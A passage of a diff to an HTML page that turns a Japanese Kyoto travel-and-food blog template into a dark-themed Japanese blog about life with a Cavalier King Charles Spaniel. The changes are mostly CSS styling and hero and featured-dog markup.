@@ -3,555 +3,861 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Tabisuru Note — 旅と食の記録</title>
-  <link href="https://fonts.googleapis.com/css2?family=Noto+Serif+JP:wght@400;700&family=Noto+Sans+JP:wght@300;400;500&family=Playfair+Display:ital,wght@0,700;1,400&display=swap" rel="stylesheet">
+  <title>Cavalier Days｜キャバリアと暮らす日々</title>
+  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400;0,600;1,400&family=Noto+Serif+JP:wght@300;400;500&family=Cormorant+Garamond:ital,wght@0,300;0,400;1,300&display=swap" rel="stylesheet">
   <style>
-    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-
     :root {
-      --cream: #0f0e0c;
-      --ink: #ede9e3;
-      --warm-gray: #9a948e;
-      --accent: #c8956c;
-      --accent-light: #221a14;
-      --border: #2a2520;
-      --white: #1a1714;
+      --bg-deep: #0d0d0f;
+      --bg-card: #141418;
+      --bg-hover: #1c1c22;
+      --accent-gold: #c9a96e;
+      --accent-warm: #e8c49a;
+      --accent-rose: #d4868a;
+      --text-primary: #f0ebe3;
+      --text-secondary: #a89880;
+      --text-muted: #6b5f52;
+      --border: rgba(201, 169, 110, 0.15);
+      --border-hover: rgba(201, 169, 110, 0.35);
+      --glow: rgba(201, 169, 110, 0.08);
     }
+
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
     html { scroll-behavior: smooth; }
 
     body {
-      font-family: 'Noto Sans JP', sans-serif;
-      background: var(--cream);
-      color: var(--ink);
+      background-color: var(--bg-deep);
+      color: var(--text-primary);
+      font-family: 'Noto Serif JP', serif;
       line-height: 1.8;
-      font-weight: 300;
+      cursor: none;
+      overflow-x: hidden;
     }
 
-    /* ===== HEADER / NAV ===== */
+    /* Custom Cursor */
+    .cursor {
+      width: 8px; height: 8px;
+      background: var(--accent-gold);
+      border-radius: 50%;
+      position: fixed;
+      top: 0; left: 0;
+      pointer-events: none;
+      z-index: 9999;
+      transform: translate(-50%, -50%);
+      transition: transform 0.1s, width 0.3s, height 0.3s, opacity 0.3s;
+    }
+    .cursor-ring {
+      width: 32px; height: 32px;
+      border: 1px solid rgba(201, 169, 110, 0.5);
+      border-radius: 50%;
+      position: fixed;
+      top: 0; left: 0;
+      pointer-events: none;
+      z-index: 9998;
+      transform: translate(-50%, -50%);
+      transition: left 0.08s ease, top 0.08s ease, width 0.3s, height 0.3s;
+    }
+    body:has(a:hover) .cursor { width: 14px; height: 14px; background: var(--accent-warm); }
+
+    /* Grain overlay */
+    body::before {
+      content: '';
+      position: fixed; inset: 0;
+      background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.04'/%3E%3C/svg%3E");
+      pointer-events: none; z-index: 0; opacity: 0.6;
+    }
+
+    /* ===== HEADER ===== */
     header {
-      position: sticky;
-      top: 0;
+      position: fixed; top: 0; left: 0; right: 0;
       z-index: 100;
-      background: rgba(15,14,12,0.92);
-      backdrop-filter: blur(10px);
+      padding: 20px 5vw;
+      display: flex; align-items: center; justify-content: space-between;
       border-bottom: 1px solid var(--border);
+      background: linear-gradient(to bottom, rgba(13,13,15,0.97), rgba(13,13,15,0.7));
+      backdrop-filter: blur(20px);
+      animation: fadeDown 0.8s ease both;
     }
-    nav {
-      max-width: 1100px;
-      margin: 0 auto;
-      padding: 0 32px;
-      height: 64px;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-    }
+    @keyframes fadeDown { from { opacity:0; transform:translateY(-20px); } to { opacity:1; transform:translateY(0); } }
+
     .logo {
       font-family: 'Playfair Display', serif;
-      font-size: 1.4rem;
-      letter-spacing: 0.02em;
-      color: var(--ink);
+      font-size: 1.5rem;
+      letter-spacing: 0.05em;
+      color: var(--accent-gold);
       text-decoration: none;
     }
-    .logo span { color: var(--accent); font-style: italic; }
-    nav ul {
-      list-style: none;
-      display: flex;
-      gap: 32px;
-    }
-    nav ul a {
+    .logo span { font-style: italic; color: var(--accent-warm); }
+
+    nav { display: flex; gap: 2rem; }
+    nav a {
+      color: var(--text-secondary);
       text-decoration: none;
       font-size: 0.78rem;
-      font-weight: 500;
-      letter-spacing: 0.12em;
+      letter-spacing: 0.18em;
       text-transform: uppercase;
-      color: var(--warm-gray);
-      transition: color 0.2s;
+      transition: color 0.3s;
+      position: relative;
     }
-    nav ul a:hover { color: var(--accent); }
+    nav a::after {
+      content: ''; position: absolute; bottom: -4px; left: 0; right: 0;
+      height: 1px; background: var(--accent-gold);
+      transform: scaleX(0); transform-origin: right;
+      transition: transform 0.3s;
+    }
+    nav a:hover { color: var(--accent-gold); }
+    nav a:hover::after { transform: scaleX(1); transform-origin: left; }
 
     /* ===== HERO ===== */
     .hero {
+      min-height: 100vh;
+      display: grid;
+      place-items: center;
+      text-align: center;
+      padding: 10rem 5vw 6rem;
       position: relative;
-      height: 78vh;
-      min-height: 520px;
       overflow: hidden;
-      display: flex;
-      align-items: flex-end;
     }
-    .hero-bg {
+
+    .hero-bg-circle {
       position: absolute;
-      inset: 0;
-      background:
-        linear-gradient(to bottom, rgba(0,0,0,0.3) 0%, rgba(0,0,0,0.75) 100%),
-        url('https://images.unsplash.com/photo-1504674900247-0877df9cc836?w=1600&q=80') center/cover no-repeat;
+      border-radius: 50%;
+      pointer-events: none;
     }
-    .hero-content {
-      position: relative;
-      z-index: 2;
-      max-width: 1100px;
-      margin: 0 auto;
-      padding: 0 32px 64px;
-      width: 100%;
+    .hero-bg-circle:nth-child(1) {
+      width: 600px; height: 600px;
+      background: radial-gradient(circle, rgba(201,169,110,0.06) 0%, transparent 70%);
+      top: 50%; left: 50%; transform: translate(-50%,-50%);
     }
+    .hero-bg-circle:nth-child(2) {
+      width: 300px; height: 300px;
+      background: radial-gradient(circle, rgba(212,134,138,0.05) 0%, transparent 70%);
+      top: 20%; right: 15%;
+      animation: float 8s ease-in-out infinite;
+    }
+    .hero-bg-circle:nth-child(3) {
+      width: 200px; height: 200px;
+      background: radial-gradient(circle, rgba(201,169,110,0.04) 0%, transparent 70%);
+      bottom: 25%; left: 10%;
+      animation: float 10s ease-in-out infinite reverse;
+    }
+    @keyframes float {
+      0%,100% { transform: translateY(0); }
+      50% { transform: translateY(-20px); }
+    }
+
     .hero-tag {
       display: inline-block;
-      background: var(--accent);
-      color: #fff;
       font-size: 0.7rem;
-      font-weight: 500;
-      letter-spacing: 0.14em;
+      letter-spacing: 0.3em;
       text-transform: uppercase;
-      padding: 5px 14px;
-      border-radius: 2px;
-      margin-bottom: 20px;
+      color: var(--accent-gold);
+      border: 1px solid var(--border-hover);
+      padding: 6px 20px;
+      border-radius: 100px;
+      margin-bottom: 2rem;
+      animation: fadeUp 1s 0.2s ease both;
     }
     .hero h1 {
       font-family: 'Playfair Display', serif;
-      font-size: clamp(2rem, 5vw, 3.4rem);
-      line-height: 1.2;
-      color: #fff;
-      max-width: 680px;
-      margin-bottom: 20px;
+      font-size: clamp(3rem, 8vw, 6.5rem);
+      font-weight: 400;
+      line-height: 1.1;
+      letter-spacing: -0.02em;
+      animation: fadeUp 1s 0.4s ease both;
     }
-    .hero-meta {
-      display: flex;
-      align-items: center;
-      gap: 20px;
-      color: rgba(255,255,255,0.75);
-      font-size: 0.82rem;
-    }
-    .hero-meta .dot { width: 3px; height: 3px; border-radius: 50%; background: rgba(255,255,255,0.5); }
-
-    /* ===== LAYOUT ===== */
-    .container {
-      max-width: 1100px;
-      margin: 0 auto;
-      padding: 0 32px;
-    }
-    .grid {
-      display: grid;
-      grid-template-columns: 1fr 300px;
-      gap: 64px;
-      padding: 72px 0;
-    }
-
-    /* ===== ARTICLE BODY ===== */
-    .article-body {
-      max-width: 700px;
-    }
-    .intro {
-      font-family: 'Noto Serif JP', serif;
-      font-size: 1.15rem;
-      line-height: 2;
-      color: #c8c2ba;
-      border-left: 3px solid var(--accent);
-      padding-left: 24px;
-      margin-bottom: 48px;
-    }
-    .article-body h2 {
-      font-family: 'Playfair Display', serif;
-      font-size: 1.6rem;
-      font-weight: 700;
-      margin: 56px 0 20px;
-      color: var(--ink);
-      position: relative;
-    }
-    .article-body h2::after {
-      content: '';
+    .hero h1 em {
+      font-style: italic;
+      color: var(--accent-gold);
       display: block;
-      width: 40px;
-      height: 2px;
-      background: var(--accent);
-      margin-top: 10px;
     }
-    .article-body p {
+    .hero-sub {
+      margin-top: 1.5rem;
+      color: var(--text-secondary);
       font-size: 0.95rem;
-      line-height: 2;
-      color: #b8b2aa;
-      margin-bottom: 24px;
+      font-weight: 300;
+      max-width: 480px;
+      margin-left: auto; margin-right: auto;
+      animation: fadeUp 1s 0.6s ease both;
     }
-    .article-body strong { font-weight: 500; color: var(--ink); }
+    .hero-paw {
+      margin-top: 3rem;
+      font-size: 2rem;
+      animation: fadeUp 1s 0.8s ease both, pawBounce 2s 2s ease-in-out infinite;
+    }
+    @keyframes fadeUp { from { opacity:0; transform:translateY(24px); } to { opacity:1; transform:translateY(0); } }
+    @keyframes pawBounce { 0%,100%{transform:translateY(0)} 50%{transform:translateY(-8px)} }
 
-    /* ===== PHOTO GRID ===== */
-    .photo-grid {
+    /* ===== FEATURED DOG ===== */
+    .featured {
+      padding: 6rem 5vw;
       display: grid;
       grid-template-columns: 1fr 1fr;
-      gap: 12px;
-      margin: 40px 0;
-      border-radius: 4px;
-      overflow: hidden;
-    }
-    .photo-grid img {
-      width: 100%;
-      aspect-ratio: 4/3;
-      object-fit: cover;
-      display: block;
-      transition: transform 0.4s ease;
-    }
-    .photo-grid img:hover { transform: scale(1.03); }
-    .photo-grid .wide {
-      grid-column: 1 / -1;
-      aspect-ratio: 16/7;
+      gap: 5rem;
+      align-items: center;
+      max-width: 1200px;
+      margin: 0 auto;
     }
 
-    /* ===== HIGHLIGHT BOX ===== */
-    .highlight-box {
-      background: var(--accent-light);
-      border-radius: 6px;
+    .featured-img-wrap {
+      position: relative;
+      animation: fadeLeft 1s ease both;
+    }
+    @keyframes fadeLeft { from{opacity:0;transform:translateX(-30px)} to{opacity:1;transform:translateX(0)} }
+
+    .dog-card-visual {
+      width: 100%;
+      aspect-ratio: 4/5;
+      border-radius: 2px 30px 2px 30px;
+      background: linear-gradient(135deg, #1e1a16 0%, #2a2118 40%, #1a1614 100%);
       border: 1px solid var(--border);
-      padding: 28px 32px;
-      margin: 40px 0;
+      display: flex; flex-direction: column;
+      align-items: center; justify-content: center;
+      gap: 1rem;
+      overflow: hidden;
+      position: relative;
+      transition: border-color 0.4s;
     }
-    .highlight-box h3 {
+    .dog-card-visual:hover { border-color: var(--border-hover); }
+
+    .dog-illustration {
+      font-size: 8rem;
+      line-height: 1;
+      filter: drop-shadow(0 0 30px rgba(201,169,110,0.3));
+      animation: float 6s ease-in-out infinite;
+    }
+    .dog-name-tag {
+      font-family: 'Cormorant Garamond', serif;
+      font-size: 1.2rem;
+      letter-spacing: 0.15em;
+      color: var(--accent-gold);
+      opacity: 0.8;
+    }
+
+    .featured-frame {
+      position: absolute;
+      inset: 12px;
+      border: 1px solid var(--border);
+      border-radius: 1px 28px 1px 28px;
+      pointer-events: none;
+    }
+
+    .featured-content {
+      animation: fadeRight 1s ease both;
+    }
+    @keyframes fadeRight { from{opacity:0;transform:translateX(30px)} to{opacity:1;transform:translateX(0)} }
+
+    .section-label {
+      font-size: 0.65rem;
+      letter-spacing: 0.35em;
+      text-transform: uppercase;
+      color: var(--accent-gold);
+      margin-bottom: 1.2rem;
+    }
+    .featured-content h2 {
       font-family: 'Playfair Display', serif;
-      font-size: 1.1rem;
-      margin-bottom: 14px;
-      color: var(--ink);
+      font-size: clamp(2rem, 4vw, 3rem);
+      font-weight: 400;
+      line-height: 1.2;
+      margin-bottom: 1.5rem;
     }
-    .highlight-box ul {
-      list-style: none;
+    .featured-content h2 em { font-style: italic; color: var(--accent-warm); }
+    .featured-content p {
+      color: var(--text-secondary);
+      font-size: 0.92rem;
+      line-height: 2;
+      margin-bottom: 1rem;
+      font-weight: 300;
+    }
+
+    .traits {
+      display: flex; gap: 0.8rem; flex-wrap: wrap;
+      margin-top: 2rem;
+    }
+    .trait {
+      padding: 6px 16px;
+      border: 1px solid var(--border);
+      border-radius: 100px;
+      font-size: 0.72rem;
+      letter-spacing: 0.12em;
+      color: var(--text-secondary);
+      transition: all 0.3s;
+    }
+    .trait:hover {
+      border-color: var(--accent-gold);
+      color: var(--accent-gold);
+      background: var(--glow);
+    }
+
+    /* ===== DIVIDER ===== */
+    .divider {
+      display: flex; align-items: center; gap: 1.5rem;
+      padding: 0 5vw; max-width: 1200px; margin: 0 auto;
+      opacity: 0.3;
+    }
+    .divider::before, .divider::after {
+      content: ''; flex: 1; height: 1px;
+      background: linear-gradient(to right, transparent, var(--accent-gold));
+    }
+    .divider::after { background: linear-gradient(to left, transparent, var(--accent-gold)); }
+    .divider span { font-size: 1rem; color: var(--accent-gold); }
+
+    /* ===== BLOG POSTS ===== */
+    .posts-section {
+      padding: 5rem 5vw;
+      max-width: 1200px;
+      margin: 0 auto;
+    }
+    .posts-header {
+      display: flex; align-items: flex-end; justify-content: space-between;
+      margin-bottom: 3rem;
+    }
+    .posts-header h2 {
+      font-family: 'Playfair Display', serif;
+      font-size: 2.2rem;
+      font-weight: 400;
+    }
+    .posts-header h2 em { font-style: italic; color: var(--accent-gold); }
+    .view-all {
+      color: var(--text-muted);
+      font-size: 0.72rem;
+      letter-spacing: 0.2em;
+      text-transform: uppercase;
+      text-decoration: none;
+      transition: color 0.3s;
+    }
+    .view-all:hover { color: var(--accent-gold); }
+
+    .posts-grid {
+      display: grid;
+      grid-template-columns: 2fr 1fr 1fr;
+      gap: 1.5px;
+      background: var(--border);
+    }
+
+    .post-card {
+      background: var(--bg-card);
+      padding: 2.5rem;
+      text-decoration: none;
+      color: inherit;
       display: flex;
       flex-direction: column;
-      gap: 8px;
-    }
-    .highlight-box ul li {
-      font-size: 0.88rem;
-      color: #9a948e;
-      display: flex;
-      align-items: flex-start;
-      gap: 10px;
-    }
-    .highlight-box ul li::before {
-      content: '✦';
-      color: var(--accent);
-      font-size: 0.7rem;
-      margin-top: 4px;
-      flex-shrink: 0;
-    }
-
-    /* ===== PULL QUOTE ===== */
-    .pull-quote {
-      font-family: 'Playfair Display', serif;
-      font-style: italic;
-      font-size: 1.35rem;
-      line-height: 1.7;
-      color: var(--warm-gray);
-      text-align: center;
-      padding: 32px 0;
-      border-top: 1px solid var(--border);
-      border-bottom: 1px solid var(--border);
-      margin: 48px 0;
-    }
-
-    /* ===== RATING CARD ===== */
-    .restaurant-card {
-      background: var(--white);
-      border: 1px solid var(--border);
-      border-radius: 8px;
+      gap: 1rem;
+      transition: background 0.3s;
+      position: relative;
       overflow: hidden;
-      margin: 48px 0;
     }
-    .restaurant-card img {
-      width: 100%;
-      height: 240px;
-      object-fit: cover;
+    .post-card::before {
+      content: ''; position: absolute; inset: 0;
+      background: radial-gradient(circle at var(--mx,50%) var(--my,50%), rgba(201,169,110,0.06), transparent 60%);
+      opacity: 0; transition: opacity 0.3s;
     }
-    .restaurant-card-body {
-      padding: 24px 28px;
-    }
-    .restaurant-card-body h3 {
-      font-family: 'Playfair Display', serif;
-      font-size: 1.3rem;
-      margin-bottom: 6px;
-      color: var(--ink);
-    }
-    .restaurant-card-body .sub {
-      font-size: 0.78rem;
-      color: var(--warm-gray);
-      letter-spacing: 0.08em;
-      text-transform: uppercase;
-      margin-bottom: 14px;
-    }
-    .stars { color: var(--accent); font-size: 1rem; margin-bottom: 14px; }
-    .restaurant-card-body p { font-size: 0.88rem; color: var(--warm-gray); margin: 0; }
+    .post-card:hover { background: var(--bg-hover); }
+    .post-card:hover::before { opacity: 1; }
 
-    /* ===== SIDEBAR ===== */
-    .sidebar {
-      padding-top: 72px;
+    .post-card.featured-post { grid-row: span 2; }
+
+    .post-emoji { font-size: 2rem; margin-bottom: 0.5rem; }
+    .post-card.featured-post .post-emoji { font-size: 3rem; }
+
+    .post-meta {
+      display: flex; align-items: center; gap: 1rem;
     }
-    .sidebar-widget {
-      margin-bottom: 48px;
-    }
-    .sidebar-widget h4 {
-      font-size: 0.72rem;
-      font-weight: 500;
-      letter-spacing: 0.15em;
+    .post-cat {
+      font-size: 0.6rem;
+      letter-spacing: 0.25em;
       text-transform: uppercase;
-      color: var(--warm-gray);
-      border-bottom: 1px solid var(--border);
-      padding-bottom: 12px;
-      margin-bottom: 20px;
+      color: var(--accent-gold);
+      padding: 3px 10px;
+      border: 1px solid rgba(201,169,110,0.3);
+      border-radius: 100px;
     }
-    .author-card {
+    .post-date { font-size: 0.7rem; color: var(--text-muted); }
+
+    .post-title {
+      font-family: 'Playfair Display', serif;
+      font-weight: 400;
+      line-height: 1.3;
+    }
+    .post-card.featured-post .post-title { font-size: 1.7rem; }
+    .post-title { font-size: 1.1rem; }
+
+    .post-excerpt {
+      color: var(--text-secondary);
+      font-size: 0.85rem;
+      line-height: 1.9;
+      font-weight: 300;
+    }
+    .post-card:not(.featured-post) .post-excerpt { display: none; }
+
+    .post-read-more {
+      margin-top: auto;
+      font-size: 0.7rem;
+      letter-spacing: 0.2em;
+      text-transform: uppercase;
+      color: var(--text-muted);
+      display: flex; align-items: center; gap: 0.5rem;
+      transition: color 0.3s, gap 0.3s;
+    }
+    .post-card:hover .post-read-more { color: var(--accent-gold); gap: 1rem; }
+
+    /* ===== GALLERY ===== */
+    .gallery-section {
+      padding: 5rem 5vw;
+      max-width: 1200px;
+      margin: 0 auto;
+    }
+    .gallery-section h2 {
+      font-family: 'Playfair Display', serif;
+      font-size: 2rem;
+      font-weight: 400;
+      margin-bottom: 2rem;
       text-align: center;
     }
-    .author-avatar {
-      width: 72px;
-      height: 72px;
-      border-radius: 50%;
-      object-fit: cover;
-      margin: 0 auto 14px;
-      display: block;
-      border: 3px solid var(--border);
-    }
-    .author-card h5 {
-      font-family: 'Playfair Display', serif;
-      font-size: 1rem;
-      margin-bottom: 6px;
-      color: var(--ink);
-    }
-    .author-card p {
-      font-size: 0.8rem;
-      color: var(--warm-gray);
-      line-height: 1.7;
-    }
+    .gallery-section h2 em { font-style: italic; color: var(--accent-rose); }
 
-    .recent-list { list-style: none; display: flex; flex-direction: column; gap: 16px; }
-    .recent-item {
-      display: flex;
-      gap: 14px;
-      align-items: flex-start;
+    .gallery-grid {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      grid-template-rows: repeat(2, 180px);
+      gap: 1.5px;
+      background: var(--border);
     }
-    .recent-item img {
-      width: 64px;
-      height: 64px;
-      object-fit: cover;
-      border-radius: 4px;
-      flex-shrink: 0;
+    .gallery-item {
+      background: var(--bg-card);
+      display: flex; align-items: center; justify-content: center;
+      flex-direction: column; gap: 0.5rem;
+      font-size: 3rem;
+      color: var(--text-muted);
+      transition: all 0.4s;
+      cursor: pointer;
+      position: relative;
+      overflow: hidden;
     }
-    .recent-item-text a {
-      text-decoration: none;
-      font-size: 0.85rem;
-      font-weight: 500;
-      color: var(--ink);
-      line-height: 1.5;
-      display: block;
-      margin-bottom: 4px;
-      transition: color 0.2s;
-    }
-    .recent-item-text a:hover { color: var(--accent); }
-    .recent-item-text span { font-size: 0.74rem; color: var(--warm-gray); }
-
-    .tag-cloud { display: flex; flex-wrap: wrap; gap: 8px; }
-    .tag {
+    .gallery-item::after {
+      content: attr(data-label);
+      position: absolute; bottom: 0; left: 0; right: 0;
+      padding: 1rem;
+      background: linear-gradient(transparent, rgba(13,13,15,0.9));
       font-size: 0.72rem;
-      letter-spacing: 0.06em;
-      padding: 5px 12px;
-      border: 1px solid var(--border);
-      border-radius: 2px;
-      color: var(--warm-gray);
-      text-decoration: none;
-      transition: all 0.2s;
+      letter-spacing: 0.12em;
+      color: var(--accent-warm);
+      transform: translateY(100%);
+      transition: transform 0.3s;
+      font-family: 'Noto Serif JP', serif;
     }
-    .tag:hover { border-color: var(--accent); color: var(--accent); }
+    .gallery-item:hover { background: var(--bg-hover); font-size: 3.5rem; }
+    .gallery-item:hover::after { transform: translateY(0); }
+    .gallery-item:nth-child(1) { grid-column: span 2; }
+    .gallery-item:nth-child(4) { grid-column: span 2; }
+
+    /* ===== SIDEBAR QUOTE ===== */
+    .quote-section {
+      padding: 5rem 5vw;
+      text-align: center;
+      position: relative;
+    }
+    .quote-section::before {
+      content: '';
+      position: absolute; top: 50%; left: 50%;
+      transform: translate(-50%,-50%);
+      width: 500px; height: 300px;
+      background: radial-gradient(ellipse, rgba(201,169,110,0.05), transparent 70%);
+      pointer-events: none;
+    }
+    .quote-mark {
+      font-family: 'Cormorant Garamond', serif;
+      font-size: 8rem;
+      line-height: 0.5;
+      color: var(--accent-gold);
+      opacity: 0.2;
+      display: block;
+      margin-bottom: 2rem;
+    }
+    blockquote {
+      font-family: 'Playfair Display', serif;
+      font-size: clamp(1.3rem, 3vw, 2rem);
+      font-style: italic;
+      font-weight: 300;
+      color: var(--text-primary);
+      max-width: 700px;
+      margin: 0 auto 1.5rem;
+      line-height: 1.6;
+    }
+    blockquote cite {
+      display: block;
+      font-family: 'Noto Serif JP', serif;
+      font-style: normal;
+      font-size: 0.75rem;
+      letter-spacing: 0.2em;
+      color: var(--text-muted);
+      margin-top: 1.5rem;
+    }
+
+    /* ===== NEWSLETTER ===== */
+    .newsletter {
+      padding: 4rem 5vw;
+      margin: 0 5vw 5rem;
+      border: 1px solid var(--border);
+      display: grid;
+      grid-template-columns: 1fr auto;
+      align-items: center;
+      gap: 3rem;
+      position: relative;
+      overflow: hidden;
+    }
+    .newsletter::before {
+      content: '🐾';
+      position: absolute;
+      right: -1rem; bottom: -2rem;
+      font-size: 10rem;
+      opacity: 0.04;
+      pointer-events: none;
+    }
+    .newsletter h3 {
+      font-family: 'Playfair Display', serif;
+      font-size: 1.5rem;
+      font-weight: 400;
+      margin-bottom: 0.5rem;
+    }
+    .newsletter h3 em { font-style: italic; color: var(--accent-gold); }
+    .newsletter p {
+      color: var(--text-secondary);
+      font-size: 0.85rem;
+      font-weight: 300;
+    }
+    .newsletter-form {
+      display: flex; gap: 0;
+    }
+    .newsletter-form input {
+      background: var(--bg-deep);
+      border: 1px solid var(--border);
+      border-right: none;
+      color: var(--text-primary);
+      padding: 12px 20px;
+      font-family: 'Noto Serif JP', serif;
+      font-size: 0.85rem;
+      outline: none;
+      width: 250px;
+      transition: border-color 0.3s;
+    }
+    .newsletter-form input:focus { border-color: var(--accent-gold); }
+    .newsletter-form input::placeholder { color: var(--text-muted); }
+    .newsletter-form button {
+      background: var(--accent-gold);
+      border: 1px solid var(--accent-gold);
+      color: var(--bg-deep);
+      padding: 12px 24px;
+      font-family: 'Noto Serif JP', serif;
+      font-size: 0.75rem;
+      letter-spacing: 0.12em;
+      cursor: pointer;
+      transition: all 0.3s;
+      white-space: nowrap;
+    }
+    .newsletter-form button:hover {
+      background: var(--accent-warm);
+      border-color: var(--accent-warm);
+    }
 
     /* ===== FOOTER ===== */
     footer {
       border-top: 1px solid var(--border);
-      padding: 48px 0;
-      margin-top: 48px;
-      text-align: center;
+      padding: 3rem 5vw 2rem;
+      display: grid;
+      grid-template-columns: 1fr 1fr 1fr;
+      gap: 3rem;
     }
-    footer .footer-logo {
-      font-family: 'Playfair Display', serif;
-      font-size: 1.5rem;
-      color: var(--ink);
-      margin-bottom: 12px;
+    .footer-brand .logo { display: block; margin-bottom: 1rem; font-size: 1.2rem; }
+    .footer-brand p {
+      font-size: 0.8rem;
+      color: var(--text-muted);
+      line-height: 1.9;
+      font-weight: 300;
     }
-    footer .footer-logo span { color: var(--accent); font-style: italic; }
-    footer p { font-size: 0.78rem; color: var(--warm-gray); }
+    .footer-col h4 {
+      font-size: 0.65rem;
+      letter-spacing: 0.28em;
+      text-transform: uppercase;
+      color: var(--accent-gold);
+      margin-bottom: 1.2rem;
+    }
+    .footer-col ul { list-style: none; }
+    .footer-col ul li { margin-bottom: 0.6rem; }
+    .footer-col ul li a {
+      text-decoration: none;
+      color: var(--text-muted);
+      font-size: 0.82rem;
+      transition: color 0.3s;
+    }
+    .footer-col ul li a:hover { color: var(--text-secondary); }
+    .footer-bottom {
+      border-top: 1px solid var(--border);
+      margin-top: 2rem;
+      padding-top: 1.5rem;
+      grid-column: 1/-1;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .footer-bottom p {
+      font-size: 0.72rem;
+      color: var(--text-muted);
+      letter-spacing: 0.08em;
+    }
+    .paw-row { display: flex; gap: 0.3rem; font-size: 0.8rem; opacity: 0.4; }
 
-    /* ===== RESPONSIVE ===== */
+    /* ===== SCROLL ANIMATIONS ===== */
+    .reveal {
+      opacity: 0;
+      transform: translateY(24px);
+      transition: opacity 0.8s ease, transform 0.8s ease;
+    }
+    .reveal.visible {
+      opacity: 1;
+      transform: translateY(0);
+    }
+
+    /* ===== SCROLLBAR ===== */
+    ::-webkit-scrollbar { width: 3px; }
+    ::-webkit-scrollbar-track { background: var(--bg-deep); }
+    ::-webkit-scrollbar-thumb { background: var(--accent-gold); opacity: 0.4; }
+
     @media (max-width: 768px) {
-      .grid { grid-template-columns: 1fr; gap: 0; }
-      .sidebar { padding-top: 0; }
-      nav ul { display: none; }
-      .hero { height: 60vh; }
+      .featured { grid-template-columns: 1fr; }
+      .posts-grid { grid-template-columns: 1fr; }
+      .post-card.featured-post { grid-row: auto; }
+      .gallery-grid { grid-template-columns: repeat(2, 1fr); grid-template-rows: repeat(4, 140px); }
+      .gallery-item:nth-child(1), .gallery-item:nth-child(4) { grid-column: auto; }
+      footer { grid-template-columns: 1fr; }
+      .newsletter { grid-template-columns: 1fr; }
+      nav { display: none; }
     }
   </style>
 </head>
 <body>
 
-<!-- NAV -->
+<div class="cursor" id="cursor"></div>
+<div class="cursor-ring" id="cursorRing"></div>
+
+<!-- ===== HEADER ===== -->
 <header>
+  <a href="#" class="logo">Cavalier <span>Days</span></a>
   <nav>
-    <a class="logo" href="#">Tabisuru <span>Note</span></a>
-    <ul>
-      <li><a href="#">旅の記録</a></li>
-      <li><a href="#">グルメ</a></li>
-      <li><a href="#">ホテル</a></li>
-      <li><a href="#">About</a></li>
-    </ul>
+    <a href="#">はじめに</a>
+    <a href="#">日記</a>
+    <a href="#">お手入れ</a>
+    <a href="#">グッズ</a>
+    <a href="#">ギャラリー</a>
   </nav>
 </header>
 
-<!-- HERO -->
+<!-- ===== HERO ===== -->
 <section class="hero">
-  <div class="hero-bg"></div>
-  <div class="hero-content">
-    <span class="hero-tag">京都 / グルメ</span>
-    <h1>祇園の隠れ家で食べた、<br>忘れられない鴨川の朝ごはん</h1>
-    <div class="hero-meta">
-      <span>山田 あかり</span>
-      <span class="dot"></span>
-      <span>2025年11月8日</span>
-      <span class="dot"></span>
-      <span>読了時間 約5分</span>
+  <div class="hero-bg-circle"></div>
+  <div class="hero-bg-circle"></div>
+  <div class="hero-bg-circle"></div>
+  <div>
+    <div class="hero-tag">キャバリア・キング・チャールズ・スパニエル</div>
+    <h1>愛おしい<em>毎日を、</em>君と。</h1>
+    <p class="hero-sub">小さな命が運んでくる、大きな幸せ。キャバリアとの暮らしを綴る、静かで温かいブログです。</p>
+    <div class="hero-paw">🐾</div>
+  </div>
+</section>
+
+<!-- ===== FEATURED DOG ===== -->
+<section class="featured">
+  <div class="featured-img-wrap reveal">
+    <div class="dog-card-visual">
+      <div class="featured-frame"></div>
+      <div class="dog-illustration">🐶</div>
+      <div class="dog-name-tag">— ルビー, 3歳 —</div>
+    </div>
+  </div>
+  <div class="featured-content reveal">
+    <div class="section-label">Our Cavalier</div>
+    <h2>出会いは、<em>雨の日</em>だった。</h2>
+    <p>窓の外が霧雨で包まれていたあの日、ペットショップのガラス越しに目が合った。大きくて丸い瞳、クルクルと巻いた耳、ふわふわの毛並み。ルビーは静かにこちらを見つめていた。</p>
+    <p>キャバリアは「コンパニオン・ドッグ（伴侶犬）」として長い歴史を持つ犬種。その名の通り、人間のそばにいることを心から好む。一人暮らしの部屋に、温かな命がやってきた。</p>
+    <div class="traits">
+      <span class="trait">穏やかな性格</span>
+      <span class="trait">甘えん坊</span>
+      <span class="trait">運動好き</span>
+      <span class="trait">子ども想い</span>
+      <span class="trait">愛情深い</span>
     </div>
   </div>
 </section>
 
-<!-- MAIN CONTENT -->
-<div class="container">
-  <div class="grid">
+<div class="divider"><span>🌿</span></div>
 
-    <!-- ARTICLE -->
-    <main class="article-body">
-      <p class="intro">
-        京都に来るたびに思う。この街は、朝が一番美しい。人混みが押し寄せる前の静けさの中で、石畳を歩いていると、ここが現代だとは到底思えなくなる。今回は、そんな祇園の路地裏で偶然たどり着いた小さな食堂の話を書きたい。
-      </p>
-
-      <h2>鴨川沿いを歩いていたら</h2>
-      <p>
-        宿を出たのは朝の6時半。秋の京都の朝は、空気が冷たくてピンとしている。鴨川沿いをぼんやり歩いていると、橋の手前に細い路地を見つけた。普通なら素通りするような場所だ。けれどそこから、味噌と出汁のやわらかな匂いが漂ってきた。
-      </p>
-      <p>
-        引き寄せられるように入っていくと、年季の入った引き戸に、手書きの小さな看板。<strong>「朝ごはん　七時から」</strong>とだけ書いてある。既に中に先客がいた。カウンター8席だけの、本当に小さな食堂だった。
-      </p>
-
-      <div class="photo-grid">
-        <img src="https://images.unsplash.com/photo-1547592180-85f173990554?w=800&q=80" alt="日本の朝食">
-        <img src="https://images.unsplash.com/photo-1540189549336-e6e99c3679fe?w=800&q=80" alt="料理">
